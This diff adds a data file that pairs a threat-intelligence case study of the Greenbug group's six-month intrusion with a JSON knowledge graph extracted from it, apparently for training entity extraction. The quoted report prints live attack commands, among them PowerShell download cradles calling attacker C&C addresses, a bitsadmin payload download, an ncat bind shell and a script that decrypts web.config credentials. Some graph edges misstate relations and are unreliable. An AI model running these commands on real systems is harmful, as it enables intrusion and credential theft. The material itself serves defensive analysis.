@@ -1,0 +1,189 @@
+
+
+
+Sentence : Case study: Six-month intrusion
+Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in
+gaining access to the organization’s database server. The attackers were observed executing various PowerShell commands
+on the victim system.
+The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a
+CobaltStrike Beacon module to download the next stage payload.
+We were able to extract two command and control (C&C) server addresses from the PowerShell command.
+Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via
+$PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same
+previously mentioned C&C server.
+PowerShell.exe -nop -w hidden -c $L=new-object net.webclient;$L.proxy=
+$L.downloadstring('http://95[.]179.177.157:445/0Zu5WpWN');
+This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the
+attackers were also observed attempting to perform a download to CSIDL_APPDATA\a8f4.exe via the bitsadmin utility
+bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exe
+The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we
+commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the
+compromised machine.
+A short time later, the attackers executed several tools from CSIDL_SYSTEM86[REDACTED] directory:
+2a3f36c849d9fbfe510c00ac4a‐
+ca1750452cd8f6d8b1bc234d22bc0c40ea1613
+9809aeb6fd388d‐
+b9ba60843d5a8489fea268ba30e3935cb142ed914d49c79ac5
+3c6bc3294a0b4b6e95f747ec847660ce22c5c4eee2681d02c‐
+c63f2a88d2d0b86
+csidl_system_drive\
+[REDACTED]
+csidl_system_drive\
+[REDACTED]
+csidl_system_drive\
+[REDACTED]
+revshel‐
+l.exe
+printer‐
+s.exe
+msf.exe
+The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1.
+PowerShell.exe -ExecutionPolicy Bypass -File CSIDL_SYSTEM_DRIVE[REDACTED]\msf.ps1
+This command was executed several times and is likely used to install a Metasploit payload to retain access to the
+compromised machine. That is the last activity seen on that day.
+No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The
+PowerShell command follows the execution of the w3wp.exe process – an application that is used to serve requests to a web
+application. This may indicate that the attackers have used a webshell on the compromised machine.
+The following is a copy of the PowerShell command executed by the attackers:
+https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia 2/7
+5/21/2020 Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia | Symantec Blogs
+$ErrorActionPreference = 'SilentlyContinue';$path="C:[REDACTED]\";Foreach ($file in (get-childitem $path -Filter
+web.config -Recurse)) {; Try { $xml = xml } Catch { continue };Try { $connstrings =
+$xml.get_DocumentElement() } Catch { continue };if
+($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null){;$tempdir = (Get-Date).Ticks;newitem $env:temp\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\$tempdir;$aspnet_regiis =
+(get-childitem $env:windir\microsoft.net\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf
+""connectionStrings"" ' + $env:temp + '\' + $tempdir;Invoke-Expression $aspnet_regiis; Try { $xml = xml } Catch { continue };Try { $connstrings = $xml.get_DocumentElement() } Catch { continue
+};remove-item $env:temp\$tempdir -recurse};Foreach ($ in $connstrings.ConnectionStrings.add) { if
+($.connectionString -ne $NULL) { write-host ""$file.Fullname --- $_.connectionString""} } };
+This command is used to search for files similar to web.config. For each file found, it extracts username and password
+information where possible, decrypting it using the aspnet_regiis.exe utility. These credentials may be used to access
+organizational resources such as SQL servers.
+Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool:
+pls.exe . An hour later, the attackers bound cmd.exe to a listening port using netcat with the following command:
+CSIDL_SYSTEM_DRIVE[REDACTED]\infopagesbackup\ncat.exe [REDACTED] 8989 -e cmd.exe
+The same command was issued again about 20 minutes later.
+Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe.
+They issued the following commands:
+Command Description
+CSIDL_SYSTEM\cmd.exe" /c net user" List all available local user accounts and information
+PowerShell -c Get-PSDrive -PSProvider
+\" FileSystem\"""""""
+List all available drives on the filesystem and related information
+(e.g. available space, location etc.)
+The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then
+checked that the user was added. No further activity was observed until March 4, when a PowerShell command was
+launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a specific
+account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from
+%USERPROFILE%\documents\x64.
+On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they
+had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably
+to test the credentials and connectivity.
+PowerShell -C
+$conn=new-object System.Data.SqlClient.SQLConnection(" ""Data
+Source=[REDACTED];User [REDACTED] { $conn.Open(); }Catch { continue;
+}$cmd = new-object System.Data.SqlClient.SqlCommand(" ""select
+@@version;" "", $conn);$ds=New-Object
+system.Data.DataSet;$da=New-Object
+system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill($ds);$ds.Tables[0];$conn.Close();""
+Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools
+from a remote host.
+PowerShell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=
+$k.downloadstring('http://185.205.210.46:1003/iO0RBYy3O');
+PowerShell.exe -nop -w hidden -c $m=new-object net.webclient;$m.proxy=
+$m.downloadstring('http://185.205.210.46:1131/t8daWgy9j13');
+https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia 3/7
+5/21/2020 Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia | Symantec Blogs
+That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were
+observed being executed:
+Command Description
+PowerShell.exe" -noninteractive -executionpolicy by‐
+pass whoami"
+PowerShell.exe" -noninteractive -executionpolicy by‐
+pass netstat -a"
+Check the account name of the current user executing
+the command
+Network routing information
+Next, PowerShell was used to connect to a database server and check the version information, likely to confirm working
+credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP
+address.
+Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been
+communicated with) via an arp -a command. That is the last activity we observed on this machine.
+A number of suspicious files were found on this machine (see IoCs). The files include the Covenant tool and Mimikatz, as
+already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines,
+and multiple webshells.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Greenbug", "type" : "ACTO"},
+        {"id": 2, "description": "Organization’s database server", "type" : "APPS"},
+        {"id": 3, "description": "PowerShell commands", "type" : "EXEF"},
+        {"id": 4, "description": "CobaltStrike Beacon module", "type" : "DOCF"},
+        {"id": 5, "description": "Command and control (C&C) server addresses", "type" : "CCSH"},
+        {"id": 6, "description": "Malicious file hosted on C&C server", "type" : "DOCF"},
+        {"id": 7, "description": "http://95[.]179.177.157:445/0Zu5WpWN", "type" : "URLS"},
+        {"id": 8, "description": "a8f4.exe", "type" : "DOCF"},
+        {"id": 9, "description": "http://95.179.177.157:8081/asdfd", "type" : "URLS"},
+        {"id": 10, "description": "CSIDL_APPDATA\\a8f4.exe", "type" : "SYSP"},
+        {"id": 11, "description": "bitsadmin utility", "type" : "APPS"},
+        {"id": 12, "description": "CSIDL_SYSTEM86[REDACTED] directory", "type" : "TPTH"},
+        {"id": 13, "description": "revshel.exe", "type" : "DOCF"},
+        {"id": 14, "description": "printer-s.exe", "type" : "DOCF"},
+        {"id": 15, "description": "msf.exe", "type" : "DOCF"},
+        {"id": 16, "description": "CSIDL_SYSTEM_DRIVE[REDACTED]\\msf.ps1", "type" : "DOCF"},
+        {"id": 17, "description": "w3wp.exe process", "type" : "EXEF"},
+        {"id": 18, "description": "webshell", "type" : "APPS"},
+        {"id": 19, "description": "web.config files", "type" : "DOCF"},
+        {"id": 20, "description": "aspnet_regiis.exe utility", "type" : "EXEF"},
+        {"id": 21, "description": "pls.exe", "type" : "DOCF"},
+        {"id": 22, "description": "ncat.exe", "type" : "DOCF"},
+        {"id": 23, "description": "cmd.exe", "type" : "EXEF"},
+        {"id": 24, "description": "CSIDL_SYSTEM\\cmd.exe /c net user", "type" : "EXEF"},
+        {"id": 25, "description": "PowerShell -c Get-PSDrive -PSProvider \" FileSystem\"", "type" : "EXEF"},
+        {"id": 26, "description": "%USERPROFILE%\\documents\\x64", "type" : "TPTH"},
+        {"id": 27, "description": "Mimikatz tool", "type" : "DOCF"},
+        {"id": 28, "description": "SQL command to retrieve version information of the database server", "type" : "EXEF"},
+        {"id": 29, "description": "http://185.205.210.46:1003/iO0RBYy3O", "type" : "URLS"},
+        {"id": 30, "description": "http://185.205.210.46:1131/t8daWgy9j13", "type" : "URLS"},
+        {"id": 31, "description": "PowerShell command to check the account name of the current user", "type" : "EXEF"},
+        {"id": 32, "description": "PowerShell command to check network routing information", "type" : "EXEF"},
+        {"id": 33, "description": "PowerShell command to connect to a database server and check version information", "type" : "EXEF"},
+        {"id": 34, "description": "arp -a command", "type" : "EXEF"},
+        {"id": 35, "description": "Covenant tool", "type" : "DOCF"},
+        {"id": 36, "description": "webshells", "type" : "APPS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "targeted"},
+        {"source": 1, "target": 3, "rel_name" : "executed"},
+        {"source": 3, "target": 4, "rel_name" : "installed"},
+        {"source": 3, "target": 5, "rel_name" : "communicated with"},
+        {"source": 3, "target": 6, "rel_name" : "downloaded"},
+        {"source": 7, "target": 6, "rel_name" : "hosted at"},
+        {"source": 8, "target": 6, "rel_name" : "downloaded from"},
+        {"source": 3, "target": 9, "rel_name" : "downloaded from"},
+        {"source": 10, "target": 8, "rel_name" : "saved to"},
+        {"source": 11, "target": 10, "rel_name" : "used to download"},
+        {"source": 12, "target": 13, "rel_name" : "contained in"},
+        {"source": 12, "target": 14, "rel_name" : "contained in"},
+        {"source": 12, "target": 15, "rel_name" : "contained in"},
+        {"source": 16, "target": 12, "rel_name" : "located at"},
+        {"source": 3, "target": 17, "rel_name" : "used to launch"},
+        {"source": 3, "target": 18, "rel_name" : "created"},
+        {"source": 19, "target": 20, "rel_name" : "parsed by"},
+        {"source": 21, "target": 19, "rel_name" : "used to parse"},
+        {"source": 3, "target": 21, "rel_name" : "executed"},
+        {"source": 3, "target": 22, "rel_name" : "used to bind cmd.exe to a listening port"},
+        {"source": 3, "target": 23, "rel_name" : "launched"},
+        {"source": 24, "target": 23, "rel_name" : "executed using"},
+        {"source": 25, "target": 23, "rel_name" : "executed using"},
+        {"source": 27, "target": 26, "rel_name" : "located at"},
+        {"source": 3, "target": 28, "rel_name" : "used to connect to database server"},
+        {"source": 29, "target": 1, "rel_name" : "downloaded by"},
+        {"source": 30, "target": 1, "rel_name" : "downloaded by"},
+        {"source": 31, "target": 3, "rel_name" : "used to check account name"},
+        {"source": 32, "target": 3, "rel_name" : "used to check network routing information"},
+        {"source": 33, "target": 3, "rel_name" : "used to connect and check version of database server"},
+        {"source": 34, "target": 3, "rel_name" : "used to view ARP table"},
+        {"source": 35, "target": 1, "rel_name" : "used by"},
+        {"source": 36, "target": 1, "rel_name" : "used by"}
+    ]
+}
